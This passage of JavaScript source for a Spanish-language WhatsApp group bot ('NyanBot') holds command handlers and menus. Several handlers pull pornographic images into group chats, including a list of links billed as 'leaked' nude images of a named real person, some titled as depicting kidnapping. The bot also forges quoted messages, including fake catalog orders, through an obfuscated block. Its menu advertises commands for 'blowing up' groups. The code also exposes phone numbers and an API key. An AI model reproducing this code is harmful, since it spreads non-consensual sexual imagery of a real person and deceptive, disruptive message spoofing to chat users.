					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					porn = await getJson('https://meme-api.herokuapp.com/gimme/lesbians', {
					method: 'get'
					})
					reply(mess.wait)
					buffer = await getBuffer(`${porn.url}`)
					samu330.sendMessage(from, buffer, image, {
					fimg})
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}tetas`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					pw = ["https://meme-api.herokuapp.com/gimme/tits",
					"https://meme-api.herokuapp.com/gimme/BestTits",
					"https://meme-api.herokuapp.com/gimme/boobs",
					"https://meme-api.herokuapp.com/gimme/amazingtits",
					"https://meme-api.herokuapp.com/gimme/TinyTits"]
					nk = pw[Math.floor(Math.random() * pw.length)]
					porn = await getJson(`${nk}`, {
					method: 'get'
					})
					reply(mess.wait)
					buffer = await getBuffer(`${porn.url}`)
					samu330.sendMessage(from, buffer, image, {
					quoted: fimg
					})
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}ass`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					pw = ["https://meme-api.herokuapp.com/gimme/CuteLittleButts",
					"https://meme-api.herokuapp.com/gimme/ass",
					"https://meme-api.herokuapp.com/gimme/boobs",
					"https://meme-api.herokuapp.com/gimme/ass"]
					nk = pw[Math.floor(Math.random() * pw.length)]
					porn = await getJson(`${nk}`, {
					method: 'get'
					})
					reply(mess.wait)
					buffer = await getBuffer(`${porn.url}`)
					samu330.sendMessage(from, buffer, image, {
					quoted: fimg
					})
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}porno`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					pornito = ["https://fxc7-api.herokuapp.com/api/amateur?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/anal?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/anal_gape?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/asian?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ass?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ass-fucking?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/japanese?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/babe?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ball_licking?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/bath?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/anal?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/anal_penetration?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/areolae?apikey=Fxc7"]
					nopor = pornito[Math.floor(Math.random() * pornito.length)]
					reply('*Espera un momento porfavor*')
					iwant = await getJson(`${nopor}`, {method: 'get'})
					you = await getBuffer(`${iwant.result}`)
					sendFile(you, sam, '🍒')
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}pussy`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					pw = ["https://meme-api.herokuapp.com/gimme/pussy",
					"https://meme-api.herokuapp.com/gimme/LegalTeens"
					]
					nk = pw[Math.floor(Math.random() * pw.length)]
					porn = await getJson(`${nk}`, {
					method: 'get'
					})
					reply(mess.wait)
					buffer = await getBuffer(`${porn.url}`)
					samu330.sendMessage(from, buffer, image, {
					quoted: fimg
					})
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}belle`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					bd = ["https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-1-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-2-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-3-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-4-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-5-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-6-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-7-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-8-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-9-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-10.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-11-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-12-715x385.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-13-715x385.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-13-715x385.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-14-715x385.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-15.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-15.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-17.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-17.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-18.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-19.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-20.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-21.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-22.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-23.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-24.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-25.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-27.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-28.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-29.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-30.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-31.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-31.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-32.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-33.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-34.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-35.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-36.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-37.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-38.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-39.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-40.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-41.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-1-715x536.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-2-715x536.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-3-715x537.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-4-715x953.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-5.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-6.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-7.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-8.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-9.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-10-715x859.jpg"]
					bdp = bd[Math.floor(Math.random() * bd.length)]
					sendFileFromUrl(bdp, image, {quoted: fimg, caption: `*Imagenes filtradas de Belle Delphine*\n\n_By @${'5219984907794@s.whatsapp.net'.split("@")[0]}_`, sendEphemeral: true, contextInfo: {mentionedJid: ['5219984907794@s.whatsapp.net']}})
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}xwaifu`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					reply('*Buscando una buena imagen...*')
					waifu = await getJson(`https://api.waifu.pics/nsfw/waifu`)
					sendFileFromUrl(waifu.url, image, {quoted: fimg, caption: '💎 *Samu330 | NyanBot* 💠', sendEphemeral: true})
					addFilter(from)
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}xneko`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					reply('*Buscando una buena imagen...*')
					waifu = await getJson(`https://api.waifu.pics/nsfw/neko`)
					sendFileFromUrl(waifu.url, image, {quoted: fimg, caption: '💎 *Samu330 | NyanBot* 💠', sendEphemeral: true})
					addFilter(from)
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}trap`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					reply('*Buscando una buena imagen...*')
					waifu = await getJson(`https://api.waifu.pics/nsfw/trap`)
					sendFileFromUrl(waifu.url, image, {quoted: fimg, caption: '💎 *Samu330 | NyanBot* 💠', sendEphemeral: true})
					addFilter(from)
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}blow`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					reply('*Buscando una buena imagen...*')
					waifu = await getJson(`https://api.waifu.pics/nsfw/blowjob`)
					sendFileFromUrl(waifu.url, image, {quoted: fimg, caption: '💎 *Samu330 | NyanBot* 💠', sendEphemeral: true})
					addFilter(from)
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`VIP`)){
					reply('*Espera porfavor...*')
			samu330.sendMessage(from, fs.readFileSync('./media/vip.mp4'), video, {quoted: sam, mimetype: 'video/gif', caption: `👑 *REGALITO PARA LOS USUARIOS DE NYANBOT POR PARTE DE @${'5219984907794@s.whatsapp.net'.split("@")[0]}* 🍑`, sendEphemeral: true, duration: -6666666, contextInfo: {mentionedJid: ['5219984907794@s.whatsapp.net']}})
			}
			}

			if (sam.message.listResponseMessage){                                                                           test = sam.message.listResponseMessage.singleSelectReply.selectedRowId  
			if (test.includes(`thanksto`)){
			const ds6 = "50768666666@s.whatsapp.net"
			const aiden = "595986460945@s.whatsapp.net"
			const pike = "51966653383@s.whatsapp.net"
			const pay = "15164688607@s.whatsapp.net"
gracias =
`*Agradecimientos especiales a:*\n\n*[ Kevin (ds6)]*\n✨ Ayuda especial.\n📀 https://github.com/ds6\n< *@${ds6.split('@')[0]}* >\n\n*[ Aiden ]*\n🧩 Ayuda en General.\n📀 https://github.com/iamaidend\n< *@${aiden.split('@')[0]}* >\n\n*[ Pike ]*\n📀 https://github.com/PikennyW\n< *@${pike.split('@')[0]}* >\n\n\n✨Agradecimientos Especiales:\n\n< *@${pay.split('@')[0]}* >`
			samu330.sendMessage(from, `${gracias}`, MessageType.text, {sendEphemeral: true, quoted:  { key: {
				            fromMe: false,
				            participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "5219984907794@s.whatsapp.net" } : {})
				            },
					                message: {
							            "documentMessage": { "title": `🍉Samu330🍒`, 'jpegThumbnail': fs.readFileSync('./media/SmWW.png')}}
								                }, contextInfo: {"externalAdReply": { "title": "🎩NyanBot | সামু৩৩০🏹", "body": "[ ★ ] 山姆 330", "sourceUrl": `https://youtube.com/channel/UCHD4T8Pfcv5PFVzsAbfAPZA`, "thumbnail": fs.readFileSync('./media/reply.png')}, mentionedJid: [ds6, aiden, pike, pay]}})
                                                                                                                                  }                                                                                                         }

			/*if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}lesbian`)){
			
			}
			}*/
			
	    
	//Zona de Comandos🛵
switch (command) {

case 'help':
case 'menu':
case 'comandos':
reply(`*EL MENU CAMBIO, AHORA PARA PEDIR EL MENU USA EL STICKER QUE SE ENVIARA A CONTINUACION.*

_☣NO RENOMBRES NI CAMBIES NADA DEL STICKER, YA QUE SI LO HACES PERDERA SU FORMATO Y EL BOT NO PODRA RECONOCER EL FileSha256 Y NO SE ENVIARA EL MENU!_`)
samu330.sendMessage(from, fs.readFileSync(`./temp/menu.webp`), sticker, {quoted: fimg, "forwardingScore": 9999, "isForwarded": true})
reply(`*Si tienes problemas con el nuevo menu, usa el anterior, el nuevo comando para el menu anterior es: ${prefix}menuofc*`)
break

case 'menuofc':

redes = ['*Sigeme y te sigo en instagram!* https://www.instagram.com/samu330wabot', '*😊Seamos amigos en facebook!!* https://www.facebook.com/samu330wabot']
opcion = redes[Math.floor(Math.random() * redes.length)]

var num = sam.participant
foto = fs.readFileSync('./src/help.jpg')
fakee = fs.readFileSync('./src/fake.jpg')
assistant = fs.readFileSync('./src/assistant.jpg')
const forder = { key : {fromMe: false,participant : "0@s.whatsapp.net", ...(from ? { remoteJid: "5214447000377-1624232428@g.us" } : {})},message: {orderMessage: {itemCount : 999999999,status: 1,surface : 1,message: `🥀𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝑁𝑦𝑎𝑛𝐵𝑜𝑡🍒`,orderTitle: 'Samu330',sellerJid: `𝗡𝘆𝗮𝗻𝗕𝗼𝘁🌱`,thumbnail: fs.readFileSync('./src/fake.jpg')}}}
samu330.updatePresence(from, Presence.recording)
uptime = process.uptime()
		
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
try {		
Menu = `
➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li
🔐Hola *${pushname}* ${timeFt}

_Tipo de usuario:_ ${tipoDeUsr}
┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✨XP: ${getLevelingXp(sender)}
📚Nivel: ${getLevelingLevel(sender)}
🕋rango: ${rango}
┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈

🌹ڰۣڿڰۣڿஇღԑ̮̑ঙღڰۣڿڰۣڿஇ🌹

_Si quieres saber como crear este bot, usa el comando:_

${prefix}crear

🌹ڰۣڿڰۣڿஇღԑ̮̑ঙღڰۣڿڰۣڿஇ🌹

🕐Son las *${hora}*\n\n🍃Hoy es *${week1}  ${calender1}*

${opcion}

======[ *Versión 3.59* ]======

*⚙ LA KEY DE LA API FUE DESHABILITADA, PERO SI LA NECECITAS PUEDES ESCRIBIRME PARA QUE TE LA COMPARTA, ESTO ES POR MOTIVOS DE SEGURIDAD, YA QUE LA ANTERIOR KEY FUE EXPUESTA Y BLOQUEADA POR ESTA RAZON. ⚙*
_SI TIENES ALGUNA KEY QUE CREES QUE PUEDE FUNCIONAR, PUEDES AGREGARLA CON EL COMANDO:_

${prefix}api + key

_Recuerda que cada vez que enciendas el bot debes establecer de nuevo la apikey!!_

===============================


*Comandos usados hoy : ${hit_today.length}*

_PORFAVOR LEE LAS REGLAS_:

${prefix}reglas

_QUIERES VER QUE HAY DE NUEVO?_
*Escribe: ${prefix}nuevo*

${samu} ✏Prefijo:${samu} [ ${prefix} ]
${samu} 🕐Tiempo de actividad:${samu} *${uptime}*
${samu} ✅Modo:${samu} *ON*
${samu} 👥Grupo:${samu} *${groupName}*
${samu} 🏆Numero del Dueño wa.link/wpnz32${samu}

𝗠𝗬 𝗖𝗔𝗡𝗔𝗟 𝗗𝗘 𝗬𝗢𝗨𝗧𝗨.𝗕𝗘: shrtco.de/CanalDeSamu

⍣ *BOT INFO* ⍣
${samu}◦ 🌐Navegador :${samu} *${samu330.browserDescription[1]}*
${samu}◦ 📡servidor :${samu} *${samu330.browserDescription[0]}*
${samu}◦ ✅version :${samu} *${samu330.browserDescription[2]}*
${samu}◦ 🚄Velocidad :${samu} *${process.uptime()}*
${samu}◦ 📲Sistema operativo :${samu} *${samu330.user.phone.device_manufacturer}*
${samu}◦ 🪀version de${samu} *WhatsApp* : *${samu330.user.phone.wa_version}*


===============================
|| _Juega con el Bot:_ *${prefix}jugar*
|| O ${prefix}ttt
|| para eliminar el juego:
|| ${prefix}delttt
===============================


_Lista de MENUs_

${bodyM} ${prefix}menu1 *(Menu de Media*
${bodyM} ${prefix}menu2 *(Menu de Sticker)*
${bodyM} ${prefix}menu3 *(Menu de Grupos)*
${bodyM} ${prefix}menu4 *(Menu de descargas)*
${bodyM} ${prefix}menu5 *(Comandos Tools)*
${bodyM} ${prefix}menu6 *(Comandos +18)* 
${bodyM} ${prefix}menu7 *(Comandos de logos)*
${bodyM} ${prefix}menu8 *(Comandos para el Owner)*
${bodyM} ${prefix}menu9 *(Comandos para explotar grupos)*
${bodyM} ${prefix}audios *(Audios)*

ᴸᵃ ᵐᵃʸᵒʳᶦ́ᵃ ᵈᵉ ˡᵒˢ ᶜᵒᵐᵃⁿᵈᵒˢ ᶠᵘⁿᶜᶦᵒⁿᵃⁿ ᵃˡ ¹⁰⁰
ᴱˢᶜʳᶦᵇᵉ ˡᵒˢ ᶜᵒᵐᵃⁿᵈᵒˢ ᵉⁿ ˢᵘ ᶠᵒʳᵐᵃᵗᵒ ᶜᵒʳʳᵉᶜᵗᵒ ᵖᵃʳᵃ ᑫᵘᵉ ⁿᵒ ᵈᵉ ᵉʳʳᵒʳᵉˢ
ˢᶦ ᵗᶦᵉⁿᵉˢ ᵃˡᵍᵘ́ⁿ ᵖʳᵒᵇˡᵉᵐᵃ ᵒ ᵃˡᵍᵘⁿᵃ ᶠᵘⁿᶜᶦᵒ́ⁿ ᵈᵉˡ ᵇᵒᵗ ᵈᵉʲᵒ ᵈᵉ ᶠᵘⁿᶜᶦᵒⁿᵃʳ ʰᵃ́ᶻᵐᵉˡᵒ ˢᵃᵇᵉʳ ᵃ ᵐᶦ̣.ᵂʰᵃᵗˢᴬᵖᵖ.li
*O envia una queja de un problema con el comando* _${prefix}reportar_

     -----------------------------------------------
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::                                                
¦:
¦:         . : 🐬𝐍𝐲𝐚𝐧𝐁𝐨𝐭🐬 : .
¦:     🔥❣️𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆❣️🔥
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
		     🌸 SamịPerry.li 🌸
********************************`
addFilter(from)
addLevelingLevel(sender, 5)
var _0x56da=['367342lxQRgg','relayWAMessage','52224EUhLvZ','readFileSync','3184312811796096','2ZQhqXh','37BvfGXn','1QpYCgS','233589MYSAPS','296046BsnUGu','./src/fake.jpg','11131Xmdsqw',`${Menu}`,'41623ZFgijY','4lYyqCf','INQUIRY','prepareMessageFromContent','1081869VYGFAG','1QmBtcR'];var _0x3cb2d7=_0x44c4;function _0x44c4(_0x538587,_0x3dc520){return _0x44c4=function(_0x56dab7,_0x44c4ad){_0x56dab7=_0x56dab7-0x11b;var _0x4c2ec7=_0x56da[_0x56dab7];return _0x4c2ec7;},_0x44c4(_0x538587,_0x3dc520);}(function(_0x1c8e57,_0x5dcd2a){var _0x2b3ad5=_0x44c4;while(!![]){try{var _0x1e1a08=parseInt(_0x2b3ad5(0x11b))*parseInt(_0x2b3ad5(0x127))+parseInt(_0x2b3ad5(0x12c))+parseInt(_0x2b3ad5(0x122))+parseInt(_0x2b3ad5(0x11e))*parseInt(_0x2b3ad5(0x121))+parseInt(_0x2b3ad5(0x126))*-parseInt(_0x2b3ad5(0x12b))+parseInt(_0x2b3ad5(0x124))*parseInt(_0x2b3ad5(0x11f))+-parseInt(_0x2b3ad5(0x120))*parseInt(_0x2b3ad5(0x12a));if(_0x1e1a08===_0x5dcd2a)break;else _0x1c8e57['push'](_0x1c8e57['shift']());}catch(_0x52a340){_0x1c8e57['push'](_0x1c8e57['shift']());}}}(_0x56da,0x99469),res=await samu330[_0x3cb2d7(0x129)](from,{'orderMessage':{'orderId':_0x3cb2d7(0x11d),'thumbnail':fs[_0x3cb2d7(0x11c)](_0x3cb2d7(0x123)),'itemCount':999999999,'status':_0x3cb2d7(0x128),'surface':'CATALOG','message':_0x3cb2d7(0x125),'orderTitle':'tom esta durmiendo'},'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}},{'quoted':forder,'contextInfo':{}}),samu330[_0x3cb2d7(0x12d)](res));
} catch {
samu330.sendMessage(from, fs.readFileSync('./src/ara.png'), image, {quoted: ftoko, caption: Menu, thumbnail: fs.readFileSync('./src/ara.png'), sendEphemeral: true})
}
break

case 'menu2':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
samu330.sendMessage(from, `${stc}`, MessageType.text, {quoted:
{ key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"documentMessage": { "title": "📚𝑆𝑡𝑖𝑘𝑒𝑟 𝑚𝑒𝑛𝑢", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
}})
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'menu1':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
trol = fs.readFileSync('./media/trol.mp4')
samu330.sendMessage(from, trol, video, {mimetype: 'video/mp4', caption: `${mda}`, duration: -9999999, thumbnail: fs.readFileSync('./media/reply.png'), sendEphemeral: true, quoted:
{ key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": { "caption": "🧸𝙈𝙀𝙉𝙐⁡ 𝘿𝙀 𝙈𝙀𝘿𝙄𝘼📌", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
}})
samu330.sendMessage(from, fs.readFileSync('./temp/nana.mp3'), audio, {quoted: ftoko, mimetype: "audio/mp3", ptt: true, duration: 5555555, sendEphermeral: true})
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'menu3':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
addFilter(from)
addLevelingLevel(sender, 5)		
samu330.sendMessage(from, Menug, MessageType.text, {
quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "➫𝑴𝒆𝒏𝒖 𝑫𝒆 𝑮𝒓𝒖𝒑𝒐𝒔\n❣️⃞🔥𝙎꯭𝙖͠𝙢꯭ 𝙔 ꯭𝙋꯭𝙚𝙧𝙧꯭𝙮🔥❣️" ,"jpegThumbnail": fs.readFileSync(`./NyanBot.jpg`)}}}})
break

case 'menu4':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
samu330.sendMessage(from, `${Menud}`, MessageType.text, {
quoted:  fvid})
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'menu5':
samu330.upd
